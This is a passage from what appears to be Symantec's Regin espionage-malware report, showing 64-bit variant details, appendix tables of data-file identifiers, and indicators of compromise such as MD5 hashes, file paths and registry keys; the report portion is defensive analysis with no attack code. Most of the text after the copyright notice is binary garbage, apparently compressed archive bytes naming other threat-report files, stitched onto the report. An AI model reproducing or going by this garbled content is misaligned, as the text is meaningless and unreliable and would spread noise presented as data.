    computers that may or may not be associated with 64-bit Regin, including several variants of svcsstat.exe, a file that
    aims to retrieve binary data over pipes or sockets and execute the data.
  File names
    The recovered files do not appear to fundamentally vary from their 32-bit counterparts, apart from a few noteworthy
    differences.
    The 32-bit and 64-bit versions of Regin use different file names. These differences are shown in the first section of
    this paper as well as in the appendix. Most importantly, in the 64-bit version of Regin, the names of containers are
    changed:
    
 PINTLGBP.IMD replaces SystemLog.Evt
    
 PINTLGBPS.IMD replaces SecurityLog.Evt
  Stage differences
    The 64-bit version of Regin
s Stage 1 (wshnetc.dll) is no longer a kernel mode driver, as drivers under 64-bit Windows
    must be signed. Instead, Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting
    up. Rather than loading Stage 2 from an NTFS extended attribute, Stage 1 looks for the last partition (in terms of
                                                               Page 15
                                                         Regin: Top-tier espionage tool enables stealthy surveillance
    physical location) on disk and searches for the payload in the raw sectors in this area of the disk.
    The 64-bit Regin
s Stage 3 has not been recovered. We believe that it may not exist, as the 32-bit version is a driver.
    Stage 4 is an orchestrator just like its 32-bit counterpart and it uses the same major and minor values to export
    functionality.
    Stage 5 uses the following filenames:
    
 %Windir%\IME\IMESC5\DICTS\PINTLGBP.IMD contains Stage 5 user payloads, replacing SystemLog.Evt in the
       32-bit version
    
 %Windir%\IME\IMESC5\DICTS\PINTLGBS.IMD contains Stage 5 data files, replacing SecurityLog.Evt in the 32-bit
       version
    
 The equivalent files for SystemAudit.Evt and SecurityAudit.Evt were not recovered
    No Stage 5 payload modules have been recovered.
Conclusion
    Regin is a highly-complex threat which has been used for large-scale data collection or intelligence gathering
    campaigns. The development and operation of this threat would have required a significant investment of time
    and resources. Threats of this nature are rare and are only comparable to the Stuxnet/Duqu family of malware.
    The discovery of Regin serves to highlight how significant investments continue to be made into the development
    of tools for use in intelligence gathering. Many components of Regin have still gone undiscovered and additional
    functionality and versions may exist.
Protection
    Symantec and Norton products detect this threat as Backdoor.Regin.
                                                        Page 16
APPENDIX
                                                              Regin: Top-tier espionage tool enables stealthy surveillance
Appendix
 Data files
   Regin
s data files are classified as Stage 5 components and are contained in an EVFS container.
    Table 7. Data files used by Stage 4
s framework DLL
    Major      Minor      Description
    0001       -          -
    000D       -          -
    000F       01         High-entropy blobs, cryptographic data
               02         High-entropy blobs, cryptographic data
    003D       -          -
    0007       -          -
    000B       01         Contains a path to the log file.
                          Typically, %System\config\ApplicationLog.Evt
               02         Small 8 byte files
    0033       01         A single DWORD, such as 111Ch
               03         A single DWORD, such as 1114h
    0011       -          -
    0013       01         Unknown list of records
               02         A single byte, such as 3
    C373       01         BPF bytecode for the netpcap driver
allows UDP passthrough
               02         A WORD value, such as 1
    0019       01         BPF bytecode for the netpcap driver
allows TCP passthrough
               02         A WORD value, such as 1
    0009       00         A single DWORD, such as 11030B15h
               01         Contains C&C location information
               02         C&C routines to be executed:
                          
  (C375, 1) param= 08 02
                          
  (19, 1) param= 44 57 58 00
                          
  (C373, 1) param= 08 02
                          
  (1B, 1) param= 20 00
               03         Routines to be executed
                          
   (4E69, 2)
                          
   (19, 2)
                          
   (1B, 2)
                          
   (C373, 2)(
                          
   C375, 2)
                          
   (C383, 2)(C363, 2)
               07         RC5 key used to decrypt command-and-control packets
               09         Unknown data
               0B         Unknown data
               12         A single byte, such as 1
               17         Unknown data
                                                              Page 18
                                                        Regin: Top-tier espionage tool enables stealthy surveillance
As the data files are stored in a container, they do      Table 8. Data files used by Stage 5
s modules (payloads)
not have names. Just like Stage 5 modules, they are
referenced by their filetag, which is the aggregation      Major        Minor       Description
of the major and minor identifiers. The major              C363         02          6 bytes (01 00 00 00 00 00)
identifier indicates which major routine group likely      4E3B         -
handles or creates the file.
                                                           290B         -
Not all data files have been recovered, so the             C375         01          Dword (1)
information remains incomplete.
                                                                        02          Dword (0)
Data files associated with Stage 4 kernel modules
                                                           C383         01          Dword (1)
have not been recovered
                                                                        02          Dword (0)
Table 8 lists recovered data files used by Stage 5
                                                                        10          64 bytes (512 bits)Diffie Hellman, p (prime)
modules.
                                                                        11          Byte (2)Diffie Hellman, g (generator)
The associated modules that supposedly
manipulate those data files were not recovered.            C361         10          File containing timestamps and high
                                                                                    entropy dataUnclear
                                                                        11          Dword (E10h)
                                                                        12          Dword (2)
                                                           001B         -
                                                           C399         -
                                                           C39F         00          Small file, 18h bytes, low entropy
                                                                        01          Unencrypted unicode path,
                                                                                    %Temp%\~B3Y7F.tmp
                                                           C3A1         01          Small file, 6 bytes (08 01 00 00 00 01)
                                                           28A5         02          Small file, 18h bytes, unknown
                                                           C3C1         -           -
                                                           C3B5         -           -
                                                           C36B         -           -
                                                           C351         -           -
                                                           2B5D         -          -
                                                           C3CD         -          -
                                                           C38F         -          -
                                                           C3C5         -          -
                                                           27E9         -          -
                                                          Table 9. Orphaned data files
                                                           Major Minor Description
                                                           4E25    00        Byte (1)
                                                                   01        Byte (2)
                                                           28A4    00        Unknown
                                                                   02        Small file, 8 bytes (01 00 00 00 00 00 00 00)
                                                           DEAB    01        Small file, 8 bytes (00 00 01 01 04 00 00 00)
                                                     Page 19
                                                       Regin: Top-tier espionage tool enables stealthy surveillance
Indicators of compromise
    The following details can be used to help determine whether you have been impacted by this threat.
  File MD5s
    2c8b9d2885543d7ade3cae98225e263b
    4b6b86c7fec1c574706cecedf44abded
    187044596bc1328efa0ed636d8aa4a5c
    06665b96e293b23acc80451abb413e50
    d240f06e98c8d3e647cbf4d442d79475
    6662c390b2bbbd291ec7987388fc75d7
    ffb0b9b5b610191051a7bdf0806e1e47
    b29ca4f22ae7b7b25f79c1d4a421139d
    1c024e599ac055312a4ab75b3950040a
    ba7bb65634ce1e30c1e5415be3d1db1d
    b505d65721bb2453d5039a389113b566
    b269894f434657db2b15949641a67532
    bfbe8c3ee78750c3a520480700e440f8
  File names/paths
    usbclass.sys
    adpu160.sys
    msrdc64.dat
    msdcsvc.dat
    %System%\config\SystemAudit.Evt
    %System%\config\SecurityAudit.Evt
    %System%\config\SystemLog.evt
    %System%\config\ApplicationLog.evt
    %Windir%\ime\imesc5\dicts\pintlgbs.imd
    %Windir%\ime\imesc5\dicts\pintlgbp.imd
    %Windir%\system32\winhttpc.dll
    %Windir%\system32\wshnetc.dll
    %Windir%\SysWow64\wshnetc.dll
    %Windir%\system32\svcstat.exe
                                                      Page 20
                                               Regin: Top-tier espionage tool enables stealthy surveillance
  %Windir%\system32\svcsstat.exe
Extended attributes
  %Windir%
  %Windir%\cursors
  %Windir%\fonts
  %Windir%\System32
  %Windir%\System32\drivers
Registry
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605-9452-4787-B793-
  D0204917CA58}
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\RestoreList\VideoBase
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605-9452-4787-B793-
  D0204917CA5A}
                                              Page 21
                                                                                                                               About Symantec
                                                                                     Symantec Corporation (NASDAQ: SYMC) is an information
                                                                                           protection expert that helps people, businesses and
                                                                                governments seeking the freedom to unlock the opportunities
                                                                                      technology brings -- anytime, anywhere. Founded in April
                                                                                    1982, Symantec, a Fortune 500 company, operating one of
                                                                                    the largest global data-intelligence networks, has provided
                                                                                  leading security, backup and availability solutions for where
                                                                             vital information is stored, accessed and shared. The company
                                                                              more than 20,000 employees reside in more than 50 countries.
                                                                                 Ninety-nine percent of Fortune 500 companies are Symantec
                                                                               customers. In fiscal 2014, it recorded revenues of $6.7 billion.
                                                                                       To learn more go to www.symantec.com or connect with
                                                                                                       Symantec at: go.symantec.com/social/.
                                    For specific country offices and contact numbers, please visit our website.
Symantec World Headquarters                                                                                  Copyright 
 2014 Symantec Corporation. All
350 Ellis St.                                                                                                rights reserved. Symantec, the Symantec Logo,
                                                                                                             and the Checkmark Logo are trademarks or
Mountain View, CA 94043 USA                                                                                  registered trademarks of Symantec Corporation
+1 (650) 527-8000                                                                                             or its affiliates in the U.S. and other countries.
1 (800) 721-3934                                                                                             Other names may be trademarks of their
www.symantec.com                                                                                                                             respective owners.
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation.
NO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use
of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or
typographical errors. Symantec reserves the right to make changes without prior notice.
AdversaryIntelligenceReport_DeepPanda_0 (1).pdf.txtUT
|xzR
^w"G
RL7N
+\f?
>:hj@^
iZhv=
slak
c(lj
_m@D
[vr<
,Xk&w
zS(G
RG78
BUQi
|(:c
eXoy
Mw!@
i]hY
PW<pb
}ZrT
Ik2}
|w1
a@2c
*Tg}
Tcp1
YQ([
)OQ8,5P\
}^$f
/mX),Z
,-Y
t1FF
=q6M`P
5/Cb
`5fwnF
z3W0.
c%5w+]
21gE
>2rSI
VNQ73
:Oc>
6jlP
$F'8:
I3\N
A%6D
WRK7
zlk,
k1P,
rM1o
 );I3}
B9*x
~pRb
(#v=e$
aww*
X*w7@
nd.D
yTS,
R}
k-Um
fH#C
VS1u
gi],
c'4*
|}iP
61 e
gDB7bY
wfN.
wkJnp
e(Z^(
ahY?
`=F2"
J1K9{
&&;s
ta;9
*/k3g
}S!dE
p$+SE
~<@j
>qa4
`)p
]-n}
d%"e
]hcM
-}P=
FH[Z
0}/v
t;*Y
vDpp:
rLZ9
Y8Eb
C&W
60ar
\4mFc
VLOU
@npn
;w&f
?LG
=Id3
/"06
v$D7
\k%"A
O+aH#
cG&n;
1GFhC
/"OEA29X
$B[>
Y!!L
?~=8
j2Joc
I7=D
oUB7
+EXcL
[v."
+}Q'
x_}-
>R5@
N546
(<o;
B729
^\[b!
F&Zv
0 $?
D;>W
cPr,v
dC>>
tAtm
5^l<v
3,a%
Cjmy
1<s0
<)6`
*4,v'/
}1w&
7-eC
rk}&
0Q+C$
6^O2e
UFB!
1\&ZI?G
dGKcx\@
KwXr
-Jy~<
vHvfw
NS)f
PhUZ>|:
l$y<{
3&Q&
o/jF
}8d9
lX(
37`/
R`%a
@QNgv
Gi"I
GfhY
L"O/f
h3In
/A;M
`Mr0s
f6I(.kDHh
yX"Q
Shj"
dDBs
F~VQz
VZ]%
u}-J
+ l
i&Zc
]tR;
d*.vuJ
O!}5
d$r~
CKt`
Ts--u
F4KWv
ALMq
)W)(
"=Qon
~dTf
MHK\
;%7.
oD}
}_x!
0p>*
}I2)
e')Fs
T`CI
mI*
G1go[]s
z9<h
~b~&
,1K[
H]24
NTo<
(K_T
_~ o
R}LL
u:XFDs
m$rJ
8fOW
Aq+We
I:~u
V!^%
zUNV
C\SM<
{H$"YX
nF!Y
|4>5
T77S
i7H)
HV!KEW
^iIcx
#+(|
TR|G%,A 
t}m#
]oxZ{
jqGNw
YX> 
b_]6
[$(v
3wg@
E8*t
QH,_=b
)jUOc
tUmL?
&#c
:dOV
OTev$
T/Ez2
oG\nP
6_"'
aU3g@
Fu9v
z*G9
;cvi
t;H{
vQLFB
to.E9
Q^I2
Aided_Frame_Aided_Direction.pdf.txtUT
@j1,
W8@Ho
c>Ud
W/y:i
Xtx_
w1?|;C
IM)i
fa*x_1}
1m{wO
@.^
i?'?
(9q]
(`{[
;|LC|
SUHQ
/ZIb
j"pWSg
4|>'
^$Ls!8
pu]T
C+gUY
BE/b2
QsSq
` t[
,kBR
d0`0,J;
'H<w
qg/hZ
i,3P
iCR
|,>F
)}+Kok`
 xG[
u23gEz
r,C?
s.Zxm
}$xK
IUI!
]xlZ
}(~q{
u8cU
H 6zbK
M>V,
Z1,uS
=3DH
Pd9x
C@NS
NQ>I
!Ai/
&g4;,?D
Alienvault_Scanbox.pdf.txtUT
d9&c
3@qLC(
W0,[
kI$h
mwez
qVsu
vhx?
|z@Q
]GD^
OlEe0
r.Xw
P}>UK
>X.3>`>
; 
B"Q
,I.M"|Cmx1
<~qB
-lA)XY:HH:
 YCE
fpfF-
[QA8:
Ah<f5
 vE6BA
eQ(ZDX
|eB,=
(3rnpg
CloudAtlas_RedOctober_APT.pdf.txtUT
 H\T
N`,a
\V-G
r%%E
Q>9xex
4MZoj
1>N)
$CS5
,S}w4
4m'K
S.90
P'KG
"N)%X}R
R)94
6G;
77b<)[
:%C1
9MbI
Z"Y
0]*rT
)o4'ZVKL
/ko'
.:,%
AKR\
'M},!
^sal&
Uh_~
S> s
CisY|Y
BWwG
*pc^
y`w@9
Sv9"D
&_pw59
[1!;
L9-G
RvQAfC
r/S,
a[|z
\rI4
9I^y<
^p[j\
x*Ye
qhJ,6
VFP{
]IBzq
Mn-K
ZIyx 
mFso]
Rb}7
qbNW<
+i~6
4bPw
)DuNH
sKL:
t+
Jl.M
Compromise_Greece_Beijing.pdf.txtUT
 IjD
(){.
1a|t
]V`q
$s4n
;C+gE
ca5@
/?%74M/
PI:EES1
S&i
4`a~
xrGo
+al3
poywu
s;=$
4eQr
r$6T{MsY
ow|\
:A4<
HFMt
yq{c
mLG_ejq
Z~t.
NYVdY
Pgb8
.()I&g0
_U$U
bc34E
HAF/
zJ0QG
-6ZO
4_IA
kKz]
IvnpK
Cylance_Operation_Cleaver_Report.pdf.txtUT
}5OL+
^wNg=\%
Vr<$
ETFS
YNI7,
ixT"
ygw@
x8-
&`2MX
6q(/
Ud.wj
 Znx
$a"X
I-Ub
1>,{D'
1_\0
?T_a
\B{s<
,Is%z
U00_
0kRI
ZAc9
N4Y|
j|0{~Q
Bvj(
a@jv
NkY#
E n@
O<lBU
m5/m
uVTf
q9x1!`
Uu{h
P3z uy
rM/9\
YB}8$
?YM3
^}?z
F}[?
r!/c6
!~O;
'd!2&
N~tk
wo|{
Kzs(
yHa'
IZnZ
x0]R
r!{N/
|i5{>
hN,b
 SxS
Qdr9
={z%
ya\%>
D{jF
7{zD9+4
C/?k6
29Nv
Dg91
~JZ 
dy-
rNCl1E
,a`}
:5)Yj
hYu@#
u=-+
|As S
@1]O
:0tl
*i55u
bT2\
-p`^
*<*oV
BX1M
^"A9
dWQw
1%ZYq
hk8y%m1u
[UlPO
;t<,
BW=
d{Nw
/|Cte
f[l"%9
n@}p
%D"e8
BFj0
eO*;
oO)
f" ,X
f2e(
8-I5
J^Wx
2;,dO9AY8
*3s,
Tl~w
J_A!
hUVp^&^
v>k\
b`oF
[ZSAoOj
$=G>
RhD|J
_t8r
p%[p
H-%v
U[5`
L:'\
4E3Y
A|@D@z
w.&s
Sw$m
b}G~
q!teC
*[q~
(0F:*w
|g(\
+'U;
{ely
a]A 
PYxYf
uOel
b8Yi
I~%S
s}1e
n~Zx
,Li>
*IxZ-
)kEBAS;T
5]4r
Zt"$o`
--u,
x:~^ir
9TMl
_L:M%
.E-k.
~h/_t
A4tw|
Mi{|
kTXk
X_nU
PX1~t
K:0Zy
a'K}
eOzO
Bo{#
d"EDO
Pa'9
* Q=i
lkUQ
y*rl
3eQq
,;NaJ~7|
g2_17PR
%=Me
k5F3
|0n_
c<{,9 
:/ 
jKTE
psN+
vXSu
Yxwb
GjXN
,\pZ
V~5x
?Y<Q
 />g
cQ8]
"C  2\
K{l
6bHV
r6<N
jnG!'__
{'VP
;A<Vf
1txZz
AES)
1a8S
yk8%
0d;]
|8`R
Ywm1N
)`u<
j"-Q
BDx
2hLk
<*F:f
`qWV
}"TT
i)2_%
k(_>
eQIx
y2GB
B;r*
L_)4
2-D$U
Nx)Rfl
}YF %
XLKx
0xyd
|[HU
i#y\c
|!7x
Hq^]
6U^&
(*m5}t`
R;:P 
[U*-9
MO+"z
slJ!
7ClC
{no8
c'8p!
N,\7
tN`+
(54A\\d
PPoZ`
9n[I0
 )M=
Ph4G
33ej
qyvz
> J&Rax1
bWpf
>af'
#b;g
^8a<
t$l3
SCmq0
Fl<K
ol<J
I)-Q
x11b
:hzl
/5H5'a
xR$hD
*HA^
,xo)
g_q^1
;5_h0
DcpK
ySKO
RtDx
JA[<[
R)0X>y
"Rb)v
ojv`
=uw;{
mA?c
<d=E?L
DcZH
w%#SiR
B`SrW1
`U!K]~
:#0J
u#$1
uc'Q
}d)&
`X7P{
t}<h
MrlV
. /w
Yvf@Zq
Wl:P
_PlS
"SXA
PqSD:
J*Ex
LpM;o
&a=]
pg/b
)1Nc
08<Z
<_A|
>.mj
brW5c
-LDu
^9[s*
A3F^i?4rH
-R52
*PU-
B'i{e
s,*/
h_Nbo
}$-x 
d3N9
NN<h
:e[O
Yu4X
b;xO
RM"v
]Pc'
S-?4
9ye*M
ZcMn
Nb"0
wjB~ 
ur}N
jl*V
xQmpX
x\R!
+J=~
^.)|
@A{d4
e;*5
0(%*
+Y.m)
?6Oed
#VHV
]gbqe
Y:h5
j"rOU
`8_n
{)c8I
7A7~
M)4u
&>8x!z1
md7(r
vW3e.
a"%$
&0cT
z5u"
]u`z
lCUJ
~==
+ "p
)h!fLB
n'i~G-Wc6
T-b[
@9m/
vUbr
=d!~
@h+6c|
,g^QPJ;hg
:m" 
sqTo
lx'ef
b-UE
I|!*jk
x6kj
u{WuR
Izuu
{;Vi55
P=@y&:
01M_
$~BR
Xt(a
,>D#
y{Z1
vXU"
s7s/|.%
1e^6s
vnY;
\+'B
N6P\=
32(>
qH{
c!a&
|E*4
=j&\
5K&nJo
t_j?
*DJK
b6JC
8-cwz8
VIkV
/pN}n
>?a;#.
a|L$8i
'}[$
X!I?J
P&0lW
kx"F
AmMr\
B6{A
SUOQ
:$vW
1~gQ%v
M>zeb7
N8ID
XbU0
4N$) 6
ByEO
!!X6<
BIIY
+zl9
EuXo
YU\j
@8E^
h@ZX
+D8.pP
$Jc!(
*Vfa
4Ac!-
[w`n
k=BU
o)v6
e5~n
'!2I!
h<Oi
c}J2
p{3*A
3rhZf(
@dT8+
mRPr
~|Q[
$,oF
'cNx
}^4:
OC |-
N"[b
PQUM4
hc@F
+q#W
\(K/E
`?RZ
$9GNQ~
W-V~
qaqD
B>pC
S-5y
jZPU
rzki
v8zj
c"oI
m2=(=c[
|l/8
7j<-xS
tSw>
Y;4d
GHkZ
i!\A
44\B
/W(z
G2,]
`;z,Ck
A7tFv}
am3J
kS3k
="UCb
(k\B
Kof 
O~RY
kvX}
GYnwL
))4M
ELxp
`NW(6
\]H\}
5x4s
Zb}g=
PU[w
j$FHT
r2Dzx
'@<j
\sA`
I~h$
e+BL
FWb!
#VNvL
hrC7>
;]9ON@
<L6&p
pb<8#{:
>]/@
>tX!
D!Eq&yp
U  \L{
uVTs
AH~V_
Wm{T
y*ZgL
3.T7B
'({E<
uK{V
|OT0
X9H=+G
N940
C;w_
>DOQ
e|=[7
%uf4
]BM?
#u2>
C9`B
_KGK&
dH>n
scp\}
UnWQ
H2nXX
o{v?
R&bAz
G#/y
qRd7~R
[u5Vg
K1D[ 
oi^s
#Vl,
wIF|
>WD5
hZZb
d52a
67aj
DM9
D)HB5(/
+}Sz3
J0mE
)9?r
-Z'
PmO{
k&S?+
A=>
WSs7
XE&
KT&]O
-!mh
-@3Qs
v"*i
mq6lsO
~U<?
j!3)
1#N=
/</#M6
UEBpG>;Y
=:("_
b*qqJ
CF+f
)J&s
hc0E
)k$&
Y<ku
P[SD=
I|"*
9##P
 )"|C
MiO)
.q~N$
6cLg
Gl%m
e(lS9
"Iy?
,G2-
1A:X
3~*%
V'}[Zc
_G`2
FB<-/Ug
E6pG4
Hwd
P<ep"
S_ZA
3doY
,Wu~
.'Mj
%^F__
D(:?K
5Ml/
mfwY
Z>}u
}\7H
{F\m
m/J
!'Pq
&!>K
Zptn
E)k2
GESG
)rTK11nl
i{OIu{`*4
'4RW,
]`X&
h&xV5
R":;2
(s"_i\
jbL`w
6m\SM
`=?d>Qr^
}msS
hUB2
]%9W
=k<7
[z-_
xJQ*
P~a7
t>Pa
=YzN
Y0U:
-e#Q,X}
K+ P
VQSk
$0c$
MQii
5yg<
@WcG
`5\>
#>,A
EBL?
@^|$
3?n0f
kME"
#Z:F3G
GJ(K
9hT=
P?6*
 XK72}
X637V
CDtY
|?31
]>m_
n2f[+
:O]R
09`g#
Y5Ve
Gd8&
9Rp52
.mkD
P|h#
"-$B!
]]D-
Tb0LOW
BdxJ
]f$n
MxIy
=zU9\
k-#
q<D-
{}`S
"X 8h
seer
0T#4
wzYEI
1G#.
t2rx
H&?J
R}#)#
jc%S
OSnTa
DIJs
1?;tHjo
.vAm~1
tfVU
`G>;
9e}Q
GSq.
D;W3+;
`(xV 
h]NN.
?~rUG
z]=]i~
<S3w:
vOm;ow
.N'z
(~rm^A
{$0.
6:SZ
o(=D
&5nc
m\8&
Qkn1
eCB+5
=PcX
W:0
OKd&
FAm>,
6~"]
[w=p
=Iyq
<\r?
xT^i
[oFD
ti|Z
edDJ&|
!'~l
:)`a
q*|V
I\%,
%!?1
qg#C
M4]i
UCVV
U)Az
g&:D
,tds
}[3l:
&{0c
q)D\
[;J3
!I<0
RmOr
S()R7
+Bs0#
KcV7$L
`}Rg
"pi2
(/}(C
]<QT<
,,qY
,&v=
6 =l
jgt$[\A
EB&W
-)}A\
Q5>N
4b+~(T
n>]C
}*3Y
u{D)
}1o{
 s0`
(1Yv
X$pQ
Wi/k
^a0M
Kb; ;
HPSR SecurityBriefing_Episode16_NorthKorea.pdf.txtUT
18&b{
91YU
`6jd
+Rj
m{**
RUZ{~j
USI-
HW>8JL
$g:V
|Ls)
]&7z
>K1
9{E5i
aAvm.T
ixy+&
1NNaW
!:S4A
J>/\
%dg#n@G
(Y.h
W7;0q
QaA/
dv=V
tx2d
r(dO
cU,Q
is4e4
aULf
=Lmz
BRQ7
(a,'
.m^Y
*p}X
6q-s
Z.i,&
y-)A=z
fr[H.
;"l\
C_%[
cK3"
tF8^
>pkp
/=2a
|y8D_
w"!#
eEzi
FOHI
Y\1~
%T<!
n/ p
b%,}
f4 D
 [h|+
h@Wg
I"&c?
mQho?c]
P;1Z
5|$VB
<&M*
}]A;jII
J=H/
Ig+>L
*XM
kFSI
_t2gb
w~Nj
I3}~&
&"2j+*g^rw
:]VA:
3ret
*3iI
ChYt
k@8(
\9Hm
Ff1x
Fw=Q2kG-n
[V*H
,BK "y
hw<y
?>]*
Srj
3AGm
E`e[W
:2N~L
@kJl
EKbw
?>3/
[2H75
dZN)w
 iIT
wj8y
iA9,S
|V?1
E-9Gj
"`NQ
SZdTW{
Gn)h
VQ8T
O04c
?x]7
k*z~
\_%11
+K2f
yf8ae
2Kh#%H&(Is
"3zNBtb
: )th=
fflf
JDov
.? ;
'[4_
M9^f
I ~3
^yNH
z@YA
y(?CQ
-bx'
HcvB
bCE'
k8,{
y`8[
Zf;>I%`A
)dMat
=L;q
0}gF
~6.;
ea$:/
E`PR
Mb:h
f!_dN,
3+oh
eGMa
8}hTa
EB@&
noF\
jEq-
6&Dv
]ctZ
AK{W
u(@1K
Kg=t
][=\
[g846
PE,q
y@N%j
{FDC
6PSm
/r8d
Jj,k
cpnA
)G~]D
u5|R;
={S 
Uy?Z
AM3zM
:Ap~r
1_ =
LY&A
+AT!
*"..q8Y
q\:S
Ui*<
u.Gd
tjN2A
I=l8$R
wQENn
0C)
8Glg
hLBH3
~C<q
H7[iX
&~!:
-#/R
%Pl~
J)mmkj?
&s'A]s
7(^x
cgJJ(
C\At
WZcc4z
%Q*_B
i;+-k
_vDa
hfL5
/^3w
GB^ 
g?<(
'Uw[Q
xmL 
)*yBN
*Hr
+)?\
Bo2u
-VeY\
W q/S
Lu*k
cVVY
hxm.
2wBS
@0c_
O7Pj
9{t'
?$zuC
SJCH
H.>S
UgQ~V
{B>N
2N3hm
5\lm9h
r*01
Mf?\G^*
^wZ(g
=FTB
G,82mu&
&DJQ
NM=_
)_~},k
9G\4
?c~2
i}.R[,NxW
j8MS$
$:5(
qh*8
f7t+
`P$[
h2 [
CA;>
(k!b
E*^"
>\rlf
*'Q
e&a-
YRyEg
#MW>
U+o)
nUi?
sNvU
3pdV+
d,tm
4htp3U
ibni
tCwc*S
x)]W
(sTW3<W*
{Gaa~
>@n{
f{hM
c-qaV
fl}>
YdsP
p&sjQ
S6*cP
wq$V
gftb>
BrEA5
hHCkuG
=0Ri
6,/<
~=~)
1>%[abL
cIuqx
Op}f9R
NfoXL#
`|&(
#{to
l'i6
qnZx
]C/K
`%8d
oriU
,={g?eY
!a,J
-: 9
Qu{;d
h,cQ,
uIzR
\~PI
.0+~
(^xdS
_M.9F
lvZPx
s:Q}
w@>F
d-X
9JBU
0JQg
x_l!
EEB9
k"79-
#h:Z
.3as
T_e8w
1-\r%
>v^sA
{Y(v
"?BG
}4]C
X*}`1
B~,;
Kg~
FE-b|
B%-$
TO/Y
7%LL
myrQ
*_?Q3
Qnq!}G
t1mbKSo
V=*.
2~;[
4*1P
C]I>]
ihu[
T5+_'
J*dWf
p?r/c
A{*SN
L_S)
nK^=#
;Dk^
74"S
SV6A
2*H1^
eN#BX&
syxxhs
2R|Vv
S<>[p
\%W>}
'Z,~
6wor
_~?-
SyM,
\ug_
FYNB
fyu;&|u
?]M:
@;y7w
D!X?
.XqU
Yf?|
N[<Q|f<
[LSl
kL(N
'15gU
Kjp6X
>N+#
HywLa
[D6r4
vQ;|
PJ<sO
%PX)
JY_M
9U&m
pIJtp
6"tv
q1wl
x{5b
*5`BC/
?q0=
'r.V5
8A.T
SEL/
m\%Wd
WA5N;!v
4-W<
m9E(
%4Y3t
a6{_
2?""P
EoOt
j/;'
Rq3aN
p\dt>
mfHf
uZm6D
a@[A
z*C2
92e"
s]_x
W e[L
QTeu
wy_B
+v?9
:,KG
><2M
)|w5
4^0c
Xtq~
D>$:
L00D
P3nh
M0C
u7|h
|mso
a=}1
OhD1
"\on
#!Yw
=tSh
OR.@
\nHM
S{i!<j;M
)=&`r
Ze~~af
T.?v
-Y9*l
eUrxx
-LA_ Ys
o>JHD
M2iZ+
BAfP
i^j#4
lf@'
=e5{
5)>-
/$g)
arI:
Er"xUH
g~!v
3*|OU
y@_I;
iy/v!
!,C]8
xjvMF
S2+A
S+W`
g(KH
`0`u\R
mDFem
uxZ,
P:\Q
LIT"
egVcn
75.t
[LK{
2PHw
L>o&8e
C&xK
44`@3R
.vvR
H)x)G
%]ME'
kV}]
W/#ZPe
a5HWX|
!!,)
|"R5
+#pA
$rTf
k9E0o
354<
r<;wt
Ii#Zm
ngm(
[l2K
6>0v;
CZ1dy
|.(`
vY,f
7hG^
j8#
;J4E
uIyl
q-tw
X,P9
:|!`
Zb^`
M(w'qLQBiL:
H!^9
T)Mj
(dyA-
x '8
!2M{
>5xO
U F5
0GCv5
o g2_
?ki6
j_6K
HL$0
<X5D{
 ` 9%
92:/
UH~Sn\f6IB
qPwZ
~K5HkH
g3M^
yIqF|
TKr#
Y!Ty
GXU$
u$1Y
M8*G
MPud
=?&ccr
#)T/
!d`=
j,64
8%UVVi
^|ud5
B1~T
 c2b
ryw2,
8|4Z
>Ls=
&Eq~;
)|v(E
^4BU
nK8zof
f!+^
wwF3c
!%ygC
Bgc[
yLY>)
fK@q
a|2,c
3J<L
Moz6
K;Ib
wJ}N^
<G^
0DTF
k=Zv
ot<|
dHe'
f7)s
2XnM
*x*=
rZL'
MmH|
/BXv
NHt2mX
w54bH
=}Utq
jQ3i`
ze@-
6Wo8A;0
H;!
Fe>s
6O=d
f/w`X5
Qo>Gm
"4i
L=n@
d\c(j
L0?.
]:o)
5|jU\
KZ{s
Kz6J
{tqk
FjsR
J86)
52EL
tndL
w]g7
]l_N
8d-B
*e-!
h(s2
A>](
]<sX'/?
U[Sna
r"!M
%g|#+
=acs
q}n,
<pu*
^od3=
>?~G
7xP1
T`RA
HDK]
du(,bm
@ _#
`.(/
Ey5)R
&T]T<<
RN_r
wjXG"
o<`T
e<_i
EDx5P
aI*x&E
4-RB
4`9utd
8{$co
KfZn
=1,i
l4#A
8XC8%Zi
:aDAU$
s \?5
m0b#
qB(]
`5~Y
aW+6X
q"7 
eVB 
Qe/'z
4/Su
{/$#~1>"Z:
Y4,r
9sFT{
2Cp=
7|#F@
b%3JI
Q7cU$
qQ5<
p&^F\;
cal<
RTyJA
)OdPA51Q
h?vq
< cFj
v@c 
[fs<
>pd%;L
c3I(
aD#8
Co%J
o4Srj\
XUA 
[@"s
Fn@omO
G'7{
@z.@
tQ-J
dVBK
@xsJ
<c(ME
"~nIjB
]_KF
##B;
1'>^
>}SHR<
nI17
5j7.
/<*q(
!@O^+
JkhU
J#'8
{[~W
8,RO
W_s{
35kk
*x|~
ahTCN
i!A=R
Y8w
cYhAf3
)B(6
'$CfXm
60_0
k{"S{
K20H(
7A6 &~
^`"d
Y8KHc
.ts/
*&&KM
{H\5I``/
K/;&PZ
@Dl0
NF>Sm
q[gSYD@
3ck{
'!Ul8
=>PM/D
Z$L4
6rLy
kR=}
1Q@I
@+6~
&;E3
gPT4)
u1p%/
IT(:N_
=gg9~
DpIY
%s)R
k)M8sc
7-25
vh'S
wpsQZ
5_DS
C[_,
sBAj
6JkO
gd$sE
dFF?
9>v~N
Ul$)(
Ywb2*
s0U,
r%@U
6DLv_
;mq+u
,+1T
r,4*
@1>A
ISgS2
q~o%
7zK'
Hikit_Analysis-Final.pdf.txtUT
SPurP7
e^oib
_qE*
~5q9)
xl$k
SP]o
x;nB/7
aeQUC
tU&z
4[T/
<'e*}
r:(}/E
GI-+
Hg+G
}P};
pG/s
Zf2\
k-0"B#
'fD+
tP[m
~;n3l
#z|;
iC37k
Ojp\w
$t$7
;m:fz
H+5_
W,Q}
CEjp
1h"TT
\j3D
%z ~
45$!
Xx~j<1<
VXR8B]
_Gag
uK i\
%rT]
_2*~
%e?,
=8~7
.@ay
rjtj
T9Ev
v4:q
s'n/
m:NE]
5Vm6
)z.+
k8R3`
\2;=
`Z]
gu^ U*
>XaP"y
8G#P
#; t
R'N9
